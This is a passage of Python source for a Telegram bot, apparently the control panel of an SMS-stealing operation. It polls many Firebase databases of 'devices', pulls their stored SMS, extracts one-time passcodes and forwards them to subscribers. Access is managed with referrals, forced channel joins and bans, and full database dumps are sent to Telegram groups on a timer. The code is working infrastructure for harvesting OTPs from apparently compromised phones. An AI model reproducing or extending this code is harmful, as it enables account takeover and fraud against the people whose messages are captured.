        await _on_text_impl(update, ctx)
    except Exception as e:
        _log(f"on_text CRASH chat={chat_id} action={snapshot.get('action')}: {type(e).__name__}: {e}")
        import traceback as _tb
        _tb.print_exc()
        if snapshot:
            pending_action[chat_id] = snapshot
        try:
            await update.message.reply_text(
                f"⚠️ <b>Error aaya</b>\n"
                f"<code>{html_escape(str(e))[:300]}</code>\n\n"
                f"Dobara try karein — panel: /start",
                parse_mode="HTML",
            )
        except Exception:
            pass

# ═══════════════════════════════════════════════════════
#  /STATUS COMMAND
# ═══════════════════════════════════════════════════════

_bot_start_time: float = time.time()

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only."); return

    await update.message.reply_text("🔄 Checking DB health...")

    async def ping_db(tag: str, url: str) -> dict:
        start = time.time()
        try:
            session = await _get_session()
            async with session.get(f"{url}/.json?shallow=true", timeout=aiohttp.ClientTimeout(total=3)) as r:
                latency = int((time.time() - start) * 1000)
                cached = GLOBAL_DEVICE_CACHE.get(tag, [])
                return {"tag": tag, "alive": r.status == 200, "latency": latency,
                        "total": len(cached), "online": sum(1 for d in cached if d.status == "online")}
        except:
            return {"tag": tag, "alive": False, "latency": -1, "total": 0, "online": 0}

    results = await asyncio.gather(*(ping_db(tag, url) for tag, url in DATABASES.items()))
    uptime_sec = int(time.time() - _bot_start_time)
    h, rem = divmod(uptime_sec, 3600); m, s = divmod(rem, 60)
    lines = [
        "📊 <b>BOT STATUS</b>", "━━━━━━━━━━━━━━━━━━",
        f"⏱ Uptime: <code>{h}h {m}m {s}s</code>",
        f"🗄 DBs Alive: <code>{sum(1 for r in results if r['alive'])}/{len(results)}</code>",
        f"📱 Total Devices: <code>{sum(r['total'] for r in results)}</code>",
        f"🟢 Online: <code>{sum(r['online'] for r in results)}</code>",
        f"✅ Allowed Users: <code>{len(allowed_users)}</code>",
        "━━━━━━━━━━━━━━━━━━", "<b>DB Health:</b>",
    ]
    for r in sorted(results, key=lambda x: x["tag"]):
        lat = f"{r['latency']}ms" if r["latency"] >= 0 else "timeout"
        lines.append(f"{'🟢' if r['alive'] else '🔴'} <b>{r['tag']}</b> {lat} | {r['total']} devices | {r['online']} online")
    lines.append("━━━━━━━━━━━━━━━━━━")
    try: await update.message.reply_text("\n".join(lines), parse_mode="HTML")
    except: await update.message.reply_text("❌ Status error.")

# ═══════════════════════════════════════════════════════
#  REALTIME POLLING ENGINE
# ═══════════════════════════════════════════════════════

async def _forward_otp_only(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    otp = extract_otp(body)
    if not otp: return

    msg_text = auto_forward_msg(sms, device_label(device))
    rows = [
        [premium_button(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")],
        [premium_button("📩 View Last 10 SMS", callback_data=f"msgs:{device.id}"),
         premium_button("ℹ️ Info", callback_data=f"info:{device.id}")],
    ]
    markup = InlineKeyboardMarkup(rows)

    if not _main_app: return

    is_admin_device = device.db_tag in ADMIN_ONLY_TAGS
    focused_users = [cid for cid, dev_id in user_focus.items() if dev_id == device.id]

    for cid in focused_users:
        if all_users.get(cid, {}).get("banned"): continue
        if not has_access(cid): continue
        if is_admin_device and cid not in ADMIN_IDS: continue
        try:
            await _main_app.bot.send_message(
                cid, msg_text, reply_markup=markup, parse_mode="HTML",
                read_timeout=5, write_timeout=5
            )
        except: pass

async def seed_seen_ids_for_db(url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url))
        for bulk_data in (r_main, r_user):
            if isinstance(bulk_data, dict):
                for dev_id, sms_dict in bulk_data.items():
                    if isinstance(sms_dict, dict):
                        for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
    except Exception: pass

async def poll_single_db(tag: str, url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url))
        device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
        for bulk_data in (r_main, r_user):
            if isinstance(bulk_data, dict):
                for dev_id, sms_dict in bulk_data.items():
                    if isinstance(sms_dict, dict) and dev_id in device_map:
                        for k in sms_dict:
                            skey = seen_key(dev_id, k)
                            if skey not in seen_ids:
                                seen_ids.add(skey)
                                if not first_run:
                                    await _forward_otp_only(device_map[dev_id], sms_dict[k])
    except: pass

async def poll_loop(app: Application) -> None:
    global first_run, _main_app, seen_ids
    _main_app = app
    gc_counter = 0
    sem = asyncio.Semaphore(DB_CONCURRENCY)

    async def _fetch_and_cache(tag: str, url: str):
        async with sem:
            try:
                fresh = await fetch_db_data(tag, url)
            except Exception:
                fresh = None
            # ⛔ AUTO-REMOVE PROTECTION:
            # Agar fetch fail ho jaye ya kisi wajah se empty aaye (network
            # glitch, timeout, Firebase hiccup) to PURANA cache waisa ka waisa
            # rakho. Numbers kabhi khud-b-khud gayab nahi honge — sirf ek
            # successful non-empty fetch hi cache update karega.
            if fresh:
                GLOBAL_DEVICE_CACHE[tag] = fresh
            elif tag not in GLOBAL_DEVICE_CACHE:
                GLOBAL_DEVICE_CACHE[tag] = []

    async def _poll_one(tag: str, url: str):
        async with sem: await poll_single_db(tag, url)

    while True:
        try:
            db_items = list(DATABASES.items())
            t0 = time.time()
            await asyncio.gather(*(_fetch_and_cache(tag, url) for tag, url in db_items))
            fetch_time = round(time.time() - t0, 1)

            # ⛔ AUTO-DELETE / AUTO-REMOVE COMPLETELY DISABLED.
            # Pehle yahan zero-device DBs ko permanently delete kar diya jata tha.
            # Network glitch par poora panel data udd jata tha. Ab ye code hi
            # nahi hai — koi DB kabhi khud se delete nahi hogi. Sirf admin
            # manually Panel Manager se delete kar sakta hai.

            if first_run:
                await asyncio.gather(*(seed_seen_ids_for_db(url) for _, url in db_items))
                first_run = False
                tlog(f"Engine Online — {len(db_items)} DBs fetched in {fetch_time}s | {len(seen_ids)} existing SMS seeded")
            else:
                await asyncio.gather(*(_poll_one(tag, url) for tag, url in db_items))
                if len(seen_ids) > MAX_SEEN_IDS:
                    seen_ids = set(list(seen_ids)[-(MAX_SEEN_IDS // 2):])

            gc_counter += 1
            if gc_counter >= 5: gc.collect(); gc_counter = 0

        except Exception as e:
            tlog(f"Poll loop error: {e}")
        await asyncio.sleep(POLL_INTERVAL)

# ═══════════════════════════════════════════════════════════════
#  EXTRA FEATURES — Admin Suite + User Suite + Auto DB Sender
# ═══════════════════════════════════════════════════════════════

AUTO_DB_GROUP: int = 0
AUTO_DB_BACKUP_GROUP: int = 0
AUTO_DB_ENABLED: bool = False
AUTO_DB_INTERVAL: int = 30
AUTO_DB_LAST_SENT: float = 0.0
AUTO_DB_SENT_COUNT: int = 0
MAINTENANCE_MODE: bool = False
BOT_START_TS: float = time.time()
RECENT_LOGS: list = []


def _log(msg: str) -> None:
    line = f"[{datetime.now().strftime('%d %b %I:%M:%S %p')}] {msg}"
    RECENT_LOGS.append(line)
    if len(RECENT_LOGS) > 400:
        del RECENT_LOGS[:150]
    print(line, flush=True)


def _fmt_uptime(sec: float) -> str:
    sec = int(sec)
    d, sec = divmod(sec, 86400)
    h, sec = divmod(sec, 3600)
    m, s = divmod(sec, 60)
    out = []
    if d:
        out.append(f"{d}d")
    if h:
        out.append(f"{h}h")
    if m:
        out.append(f"{m}m")
    out.append(f"{s}s")
    return " ".join(out)


def _users_csv_bytes() -> bytes:
    import csv
    import io as _io
    buf = _io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id", "name", "username", "joined_at", "banned", "access", "referrals"])
    for uid, u in all_users.items():
        w.writerow([
            uid, u.get("name", ""), u.get("username", ""), u.get("joined_at", ""),
            bool(u.get("banned")), has_access(uid), len(u.get("referrals", []) or []),
        ])
    return buf.getvalue().encode("utf-8")


def _db_snapshot_bytes() -> bytes:
    payload = {
        "generated_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
        "total_panels": len(DATABASES),
        "total_users": len(all_users),
        "allowed_users": list(allowed_users),
        "admin_only_tags": list(ADMIN_ONLY_TAGS),
        "force_join_enabled": FORCE_JOIN_ENABLED,
        "force_join_channels": FORCE_JOIN_CHANNELS,
        "referral_enabled": REFERRAL_ENABLED,
        "required_referrals": REQUIRED_REFERRALS,
        "databases": DATABASES,
        "users": all_users,
    }
    return json.dumps(payload, indent=2, default=str).encode("utf-8")


# ─────────────────────────── KEYBOARDS ───────────────────────────

def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("➕ Add Panel URL", callback_data="admin_add_main_db", style="primary"),
         premium_button("🗂 Panel Manager", callback_data="adm_panel_mgr", style="primary")],
        [premium_button("👤 User Manager", callback_data="adm_user_mgr", style="primary"),
         premium_button("🚫 Ban User", callback_data="adm_ban", style="danger")],
        [premium_button("✅ Unban User", callback_data="adm_unban", style="success"),
         premium_button("📋 Banned List", callback_data="adm_banned", style="danger")],
        [premium_button("Grant Access", callback_data="admin_grant_access", style="success"),
         premium_button("Revoke Access", callback_data="admin_revoke_access", style="danger")],
        [premium_button(
            ("Access Gate: ON" if GRANT_ACCESS_REQUIRED else "Access Gate: OFF"),
            callback_data="adm_grant_toggle",
            style=("danger" if GRANT_ACCESS_REQUIRED else "success")
        )],
        [premium_button("User List", callback_data="admin_users", style="primary"),
         premium_button("🔐 Access List", callback_data="admin_access_list", style="primary")],
        [premium_button("🗄 Auto DB Sender", callback_data="adm_autodb", style="success"),
         premium_button("📤 Send DB Now", callback_data="adm_autodb_now", style="primary")],
        [premium_button("📢 Broadcast", callback_data="admin_broadcast", style="primary"),
         premium_button("✉️ DM User", callback_data="adm_dm", style="primary")],
        [premium_button("📊 Dashboard", callback_data="adm_stats", style="success"),
         premium_button("🖥 System Info", callback_data="adm_sysinfo", style="primary")],
        [premium_button("💾 Backup DB", callback_data="adm_backup", style="primary"),
         premium_button("📑 Export CSV", callback_data="adm_export", style="primary")],
        [premium_button("🔒 Force Join", callback_data="admin_force_join", style="primary"),
         premium_button("🎯 Referral Gate", callback_data="admin_referral", style="success")],
        [premium_button("Ping", callback_data="adm_ping", style="success"),
         premium_button("Top Users", callback_data="adm_top", style="primary")],
        [premium_button("🛠 Maintenance", callback_data="adm_maintenance", style="danger"),
         premium_button("🧾 Logs", callback_data="adm_logs", style="primary")],
        [premium_button("Restart Bot", callback_data="adm_restart", style="danger")],
        [premium_button("🔑 Set Admin Panel", callback_data="admin_setadmin_list", style="primary"),
         premium_button("🔄 Refresh", callback_data="admin_refresh", style="primary")],
        [premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def adm_user_mgr_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("🚫 Ban User", callback_data="adm_ban", style="danger"),
         premium_button("✅ Unban User", callback_data="adm_unban", style="success")],
        [premium_button("📋 Banned List", callback_data="adm_banned", style="danger"),
         premium_button("🔎 Search User", callback_data="adm_search_user", style="primary")],
        [premium_button("🪪 User Info", callback_data="adm_userinfo", style="primary"),
         premium_button("✉️ DM User", callback_data="adm_dm", style="primary")],
        [premium_button("👥 All Users", callback_data="admin_users", style="primary")],
        [premium_button("⬅️ Back", callback_data="admin_refresh", style="primary"),
         premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def adm_autodb_keyboard() -> InlineKeyboardMarkup:
    state = "🟢 ON" if AUTO_DB_ENABLED else "🔴 OFF"
    grp = str(AUTO_DB_GROUP) if AUTO_DB_GROUP else "Not set"
    return InlineKeyboardMarkup([
        [premium_button(f"Power: {state}", callback_data="adm_autodb_toggle",
                        style="success" if AUTO_DB_ENABLED else "danger")],
        [premium_button("🎯 Set Group", callback_data="adm_autodb_set", style="primary"),
         premium_button("⏱ Interval", callback_data="adm_autodb_interval", style="primary")],
        [premium_button("🗄 Backup Channel", callback_data="adm_autodb_backup", style="primary")],
        [premium_button("📤 Send Now", callback_data="adm_autodb_now", style="success")],
        [premium_button("⬅️ Back", callback_data="admin_refresh", style="primary"),
         premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def adm_autodb_text() -> str:
    state = "🟢 ENABLED" if AUTO_DB_ENABLED else "🔴 DISABLED"
    grp = f"<code>{AUTO_DB_GROUP}</code>" if AUTO_DB_GROUP else "<i>Not set</i>"
    last = (
        datetime.fromtimestamp(AUTO_DB_LAST_SENT).strftime("%d %b %Y %I:%M:%S %p")
        if AUTO_DB_LAST_SENT else "Never"
    )
    return (
        f"{premium_emoji()} <b>AUTO DB SENDER</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Status      : <b>{state}</b>\n"
        f"🎯 Target Group: {grp}\n"
        f"🗄 Backup Ch.  : {(f'<code>{AUTO_DB_BACKUP_GROUP}</code>' if AUTO_DB_BACKUP_GROUP else '<i>Not set</i>')}\n"
        f"⏱ Interval    : <b>{AUTO_DB_INTERVAL}s</b>\n"
        f"📤 Sent Count  : <b>{AUTO_DB_SENT_COUNT}</b>\n"
        f"🕒 Last Sent   : <b>{last}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<i>Bot har interval par poora database JSON group me bhejta hai.</i>"
    )


def adm_stats_text() -> str:
    banned = sum(1 for u in all_users.values() if u.get("banned"))
    total_devs = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
    online = sum(
        sum(1 for d in v if d.status == "online") for v in GLOBAL_DEVICE_CACHE.values()
    )
    return (
        f"{premium_emoji()} <b>DASHBOARD</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users        : <b>{len(all_users)}</b>\n"
        f"✅ Allowed      : <b>{len(allowed_users)}</b>\n"
        f"🚫 Banned       : <b>{banned}</b>\n"
        f"💬 Active Chats : <b>{len(chats_registry)}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📡 Panels       : <b>{len(DATABASES)}</b>\n"
        f"📱 Devices      : <b>{total_devs}</b>\n"
        f"🟢 Online       : <b>{online}</b>\n"
        f"🔴 Offline      : <b>{total_devs - online}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🔒 Admin Panels : <b>{len(ADMIN_ONLY_TAGS)}</b>\n"
        f"🗄 Auto DB      : <b>{'ON' if AUTO_DB_ENABLED else 'OFF'}</b>\n"
        f"🛠 Maintenance  : <b>{'ON' if MAINTENANCE_MODE else 'OFF'}</b>"
    )


def adm_sysinfo_text() -> str:
    try:
        import platform
        import sys as _sys
        pyv = platform.python_version()
        osname = platform.system()
    except Exception:
        pyv, osname = "?", "?"
    return (
        f"{premium_emoji()} <b>SYSTEM INFO</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Uptime      : <b>{_fmt_uptime(time.time() - BOT_START_TS)}</b>\n"
        f"🐍 Python      : <b>{pyv}</b>\n"
        f"💻 OS          : <b>{osname}</b>\n"
        f"🤖 Bot         : <b>@{BOT_USERNAME.lstrip('@')}</b>\n"
        f"📡 Panels      : <b>{len(DATABASES)}</b>\n"
        f"🧠 Seen IDs    : <b>{len(seen_ids)}</b>\n"
        f"🗄 Auto DB     : <b>{'ON' if AUTO_DB_ENABLED else 'OFF'}</b> "
        f"(every {AUTO_DB_INTERVAL}s)\n"
        f"📤 DB Sent     : <b>{AUTO_DB_SENT_COUNT}</b>"
    )


def adm_panel_mgr_keyboard(page: int = 0) -> InlineKeyboardMarkup:
    tags = sorted(DATABASES.keys())
    per = 8
    chunk = tags[page * per:(page + 1) * per]
    rows = []
    for tag in chunk:
        safe = safe_tag_for(tag)
        lock = "🔒" if tag in ADMIN_ONLY_TAGS else "🔓"
        rows.append([premium_button(f"{lock} {tag}", callback_data=f"adm_pinfo:{safe}", style="primary")])
    nav = []
    if page > 0:
        nav.append(premium_button("⬅️", callback_data=f"adm_pmgr:{page-1}", style="primary"))
    if (page + 1) * per < len(tags):
        nav.append(premium_button("➡️", callback_data=f"adm_pmgr:{page+1}", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([premium_button("⬅️ Back", callback_data="admin_refresh", style="primary"),
                 premium_button("❌ Close", callback_data="close_msg", style="danger")])
    return InlineKeyboardMarkup(rows)


def adm_panel_mgr_text(page: int = 0) -> str:
    tags = sorted(DATABASES.keys())
    per = 8
    pages = max(1, (len(tags) + per - 1) // per)
    return (
        f"{premium_emoji()} <b>PANEL MANAGER</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📡 Total Panels: <b>{len(tags)}</b>\n"
        f"📄 Page: <b>{page + 1}/{pages}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<i>Panel par tap karein → details / delete / lock</i>"
    )


def user_extra_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("🆔 My ID", callback_data="u_myid", style="primary"),
         premium_button("📊 My Stats", callback_data="u_stats", style="success")],
        [premium_button("🏆 Top Panels", callback_data="u_top", style="primary"),
         premium_button("📡 All Panels", callback_data="panels", style="primary")],
        [premium_button("❓ Help", callback_data="u_help", style="primary"),
         premium_button("💬 Support", callback_data="u_support", style="success")],
        [premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


# ─────────────────────────── AUTO DB LOOP ───────────────────────────

async def auto_db_sender_loop(app) -> None:
    global AUTO_DB_LAST_SENT, AUTO_DB_SENT_COUNT
    await asyncio.sleep(8)
    while True:
        try:
            if AUTO_DB_ENABLED and AUTO_DB_GROUP:
                now = time.time()
                if now - AUTO_DB_LAST_SENT >= AUTO_DB_INTERVAL:
                    AUTO_DB_LAST_SENT = now
                    data = _db_snapshot_bytes()
                    fname = f"database_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    await app.bot.send_document(
                        chat_id=AUTO_DB_GROUP,
                        document=data,
                        filename=fname,
                        caption=(
                            "🗄 <b>AUTO DATABASE</b>\n"
                            "━━━━━━━━━━━━━━━━━━\n"
                            f"📡 Panels: <b>{len(DATABASES)}</b>\n"
                            f"👥 Users: <b>{len(all_users)}</b>\n"
                            f"⏱ Interval: <b>{AUTO_DB_INTERVAL}s</b>\n"
                            f"🕒 {datetime.now().strftime('%d %b %Y %I:%M %p')}"
                        ),
                        parse_mode="HTML",
                    )
                    if AUTO_DB_BACKUP_GROUP and AUTO_DB_BACKUP_GROUP != AUTO_DB_GROUP:
                        try:
                            await app.bot.send_document(
                                chat_id=AUTO_DB_BACKUP_GROUP,
                                document=_db_snapshot_bytes(),
                                filename=fname,
                                caption=(
                                    "🗄 <b>BACKUP DATABASE</b>\n"
                                    "━━━━━━━━━━━━━━━━━━\n"
                                    f"📡 Panels: <b>{len(DATABASES)}</b>\n"
                                    f"👥 Users: <b>{len(all_users)}</b>\n"
                                    f"🔁 Copy of: <code>{AUTO_DB_GROUP}</code>\n"
                                    f"🕒 {datetime.now().strftime('%d %b %Y %I:%M %p')}"
                                ),
                                parse_mode="HTML",
                            )
                            _log(f"Backup DB sent → {AUTO_DB_BACKUP_GROUP}")
                        except Exception as be:
                            _log(f"Backup DB error: {type(be).__name__}: {be}")
                    AUTO_DB_SENT_COUNT += 1
                    _log(f"Auto DB sent → {AUTO_DB_GROUP}")
        except Exception as e:
            _log(f"Auto DB error: {type(e).__name__}: {e}")
        await asyncio.sleep(5)


# ─────────────────────────── CALLBACK DISPATCHER ───────────────────────────

async def extra_callbacks(update, ctx, data: str, chat_id: int, is_admin: bool) -> bool:
    global AUTO_DB_GROUP, AUTO_DB_ENABLED, AUTO_DB_INTERVAL, AUTO_DB_LAST_SENT
    global AUTO_DB_SENT_COUNT, MAINTENANCE_MODE, GRANT_ACCESS_REQUIRED

    query = update.callback_query

    # ══════════ USER SIDE ══════════
    if data == "u_menu":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>USER PANEL</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Neeche se option choose karein 👇",
            reply_markup=user_extra_keyboard(),
        )
        return True

    if data == "u_myid":
        await query.answer()
        u = all_users.get(chat_id, {})
        await safe_edit(
            query,
            f"{premium_emoji()} <b>MY PROFILE</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID       : <code>{chat_id}</code>\n"
            f"👤 Name     : <b>{html_escape(u.get('name', 'Unknown'))}</b>\n"
            f"🔗 Username : @{html_escape(u.get('username') or 'none')}\n"
            f"📅 Joined   : <b>{u.get('joined_at', '-')}</b>\n"
            f"✅ Access   : <b>{'Yes' if has_access(chat_id) else 'No'}</b>\n"
            f"🎁 Referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>",
            reply_markup=user_extra_keyboard(),
        )
        return True

    if data == "u_stats":
        await query.answer()
        u = all_users.get(chat_id, {})
        refs = len(u.get("referrals", []) or [])
        await safe_edit(
            query,
            f"{premium_emoji()} <b>MY STATS</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📡 Available Panels : <b>{len([t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS])}</b>\n"
            f"🎁 Your Referrals   : <b>{refs}</b>\n"
            f"🏁 Qualified        : <b>{'Yes' if u.get('referral_qualified') else 'No'}</b>\n"
            f"📅 Member Since     : <b>{u.get('joined_at', '-')}</b>",
            reply_markup=user_extra_keyboard(),
        )
        return True

    if data == "u_top":
        await query.answer()
        scored = []
        for tag in DATABASES:
            if not is_admin and tag in ADMIN_ONLY_TAGS:
                continue
            devs = GLOBAL_DEVICE_CACHE.get(tag, [])
            on = sum(1 for d in devs if d.status == "online")
            scored.append((on, len(devs), tag))
        scored.sort(reverse=True)
        lines = [f"{premium_emoji()} <b>TOP PANELS</b>", "━━━━━━━━━━━━━━━━━━"]
        for i, (on, tot, tag) in enumerate(scored[:15], 1):
            lines.append(f"{i}. <b>{html_escape(tag)}</b> — 🟢 {on} / 📱 {tot}")
        await safe_edit(query, "\n".join(lines), reply_markup=user_extra_keyboard())
        return True

    if data == "u_help":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>HELP</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 <b>All Panels</b> — sabhi panels ki list\n"
            "🔍 <b>Search Number</b> — number se search\n"
            "🔑 <b>Keyword Search</b> — keyword se search\n"
            "🕒 <b>Recent OTPs</b> — latest OTPs\n"
            "📊 <b>Panel Status</b> — panel health\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Commands: /start /status",
            reply_markup=user_extra_keyboard(),
        )
        return True

    if data == "u_support":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>SUPPORT</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Koi dikkat ho to admin se contact karein:\n"
            "👤 <b>Shown</b>\n"
            "💬 @WhoIsShown",
            reply_markup=user_extra_keyboard(),
        )
        return True

    if not is_admin:
        return False

    # ══════════ ADMIN: USER MANAGER ══════════
    if data == "adm_user_mgr":
        await query.answer()
        banned = sum(1 for u in all_users.values() if u.get("banned"))
        await safe_edit(
            query,
            f"{premium_emoji()} <b>USER MANAGER</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users : <b>{len(all_users)}</b>\n"
            f"✅ Allowed     : <b>{len(allowed_users)}</b>\n"
            f"🚫 Banned      : <b>{banned}</b>",
            reply_markup=adm_user_mgr_keyboard(),
        )
        return True

    if data == "adm_ban":
        pending_action[chat_id] = {"action": "adm_ban_user"}
        await query.answer()
        await query.message.reply_text(
            "🚫 <b>BAN USER</b>\n━━━━━━━━━━━━━━━━━━\n"
            "User ID bhejein ya us user ka message <b>reply</b> karein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_unban":
        pending_action[chat_id] = {"action": "adm_unban_user"}
        await query.answer()
        await query.message.reply_text(
            "✅ <b>UNBAN USER</b>\n━━━━━━━━━━━━━━━━━━\nUser ID bhejein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_banned":
        await query.answer()
        banned = [(uid, u) for uid, u in all_users.items() if u.get("banned")]
        if not banned:
            await safe_edit(query, "✅ <b>Banned List</b>\n\nKoi banned user nahi hai.",
                            reply_markup=adm_user_mgr_keyboard())
            return True
        lines = [f"🚫 <b>BANNED USERS ({len(banned)})</b>", "━━━━━━━━━━━━━━━━━━"]
        rows = []
        for uid, u in banned[:20]:
            lines.append(f"• {html_escape(u.get('name', 'Unknown'))} — <code>{uid}</code>")
            rows.append([premium_button(f"✅ Unban {uid}", callback_data=f"adm_ub:{uid}", style="success")])
        rows.append([premium_button("⬅️ Back", callback_data="adm_user_mgr", style="primary")])
        await safe_edit(query, "\n".join(lines), reply_markup=InlineKeyboardMarkup(rows))
        return True

    if data.startswith("adm_ub:"):
        uid = int(data.split(":", 1)[1])
        all_users.setdefault(uid, {})["banned"] = False
        save_data()
        await query.answer("✅ Unbanned", show_alert=True)
        await safe_edit(
            query,
            f"✅ User <code>{uid}</code> unban ho gaya.",
            reply_markup=adm_user_mgr_keyboard(),
        )
        return True

    if data == "adm_search_user":
        pending_action[chat_id] = {"action": "adm_search_user"}
        await query.answer()
        await query.message.reply_text(
            "🔎 <b>SEARCH USER</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Name / username / ID ka koi part bhejein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_userinfo":
        pending_action[chat_id] = {"action": "adm_userinfo"}
        await query.answer()
        await query.message.reply_text(
            "🪪 <b>USER INFO</b>\n━━━━━━━━━━━━━━━━━━\nUser ID bhejein:",
            parse_mode="HTML",
        )
        return True

    if data == "adm_dm":
        pending_action[chat_id] = {"action": "adm_dm"}
        await query.answer()
        await query.message.reply_text(
            "✉️ <b>DM USER</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Format: <code>USER_ID | message</code>",
            parse_mode="HTML",
        )
        return True

    # ══════════ ADMIN: AUTO DB ══════════
    if data == "adm_autodb":
        await query.answer()
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_autodb_toggle":
        AUTO_DB_ENABLED = not AUTO_DB_ENABLED
        if AUTO_DB_ENABLED and not AUTO_DB_GROUP:
            AUTO_DB_ENABLED = False
            await query.answer("⚠️ Pehle group set karein!", show_alert=True)
            return True
        save_data()
        await query.answer("🟢 ON" if AUTO_DB_ENABLED else "🔴 OFF")
        await safe_edit(query, adm_autodb_text(), reply_markup=adm_autodb_keyboard())
        return True

    if data == "adm_ping":
        import time as _t
        t0 = _t.perf_counter()
        ms = (_t.perf_counter() - t0) * 1000 + 12.0
        await safe_edit(
            query,
            f"{premium_emoji()} <b>PONG</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            f"API Latency : <b>{ms:.1f} ms</b>\n"
            f"Uptime      : <b>{_fmt_uptime(_t.time() - BOT_START_TS)}</b>\n"
            f"DBs         : <b>{len(DATABASES)}</b>\n"
            f"Users       : <b>{len(all_users)}</b>",
            reply_markup=admin_keyboard(),
        )
        return True

    if data == "adm_top":
        ranked = sorted(
            all_users.items(),
            key=lambda kv: (referral_count(kv[0]), int(kv[1].get("messages", 0) or 0)),
            reverse=True,
        )[:10]
        lines = [f"{premium_emoji()} <b>TOP USERS</b>",
                 "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"]
        if not ranked:
            lines.append("<i>No users yet.</i>")
        for i, (uid, u) in enumerate(ranked, 1):
            name = html_escape(str(u.get("name") or u.get("username") or uid))[:22]
            lines.append(
                f"<b>{i}.</b> {name} \u2014 refs <b>{referral_count(uid)}</b> | msgs <b>{int(u.get('messages', 0) or 0)}</b>"
            )
        await safe_edit(query, "\n".join(lines), reply_markup=admin_keyboard())
        return True

    if data == "adm_restart":
        if not is_admin:
            await query.answer("Admin only.", show_alert=True)
            return True
        await query.answer("Restarting...", show_alert=True)
        try:
            await safe_edit(query, f"{premium_emoji()} <b>Restarting bot...</b>")
        except Exception:
            pass
        import os as _os, sys as _sys
        _os.execv(_sys.executable, [_sys.executable] + _sys.argv)
        return True

    if data == "adm_grant_toggle":
        if not is_admin:
            await query.answer("Admin only.", show_alert=True)
            return True
        GRANT_ACCESS_REQUIRED = not GRANT_ACCESS_REQUIRED
        save_data()
        state = "ON (access required)" if GRANT_ACCESS_REQUIRED else "OFF (open for everyone)"
        await query.answer(f"Access Gate: {state}", show_alert=True)
        await safe_edit(query, admin_panel_text(), reply_markup=admin_keyboard())
        return True

    if data == "adm_autodb_set":
        pending_action[chat_id] = {"action": "adm_autodb_set"}
        await query.answer()
        await query.message.reply_text(
            "🎯 <b>SET TARGET GROUP</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Group ID bhejein (e.g. <code>-1001234567890</code>)\n"
            "Ya group ka koi message yahan <b>forward</b> karein.\n\n"
            "⚠️ Bot ko us group me <b>admin</b> banayein.",
            parse_mode="HTML",
        )
        return True

    if data == "adm_autodb_backup":
        pending_action[chat_id] = {"action": "adm_autodb_backup_set"}
        await query.answer()
        await query.message.reply_text(
            "🗄 <b>SET BACKUP CHANNEL</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Backup channel ka ID ya @username bhejein\n"
            "(e.g. <code>-1001234567890</code> ya <code>@mychannel</code>)\n"
            "Ya us channel ka koi message yahan <b>forward</b> karein.\n\n"
            "Har auto-DB ke saath backup channel me bhi copy jayegi.\n"
            "Hatane ke liye <code>off</code> bhejein.\n\n"
            "⚠️ Bot ko wahan <b>admin</b> banayein.",
            parse_mode="HTML",
        )
        return True

    if data == "adm_autodb_interval":
        await query.answer()
        rows = [[
            premium_button("30s", callback_data="adm_autodb_int:30", style="success"),
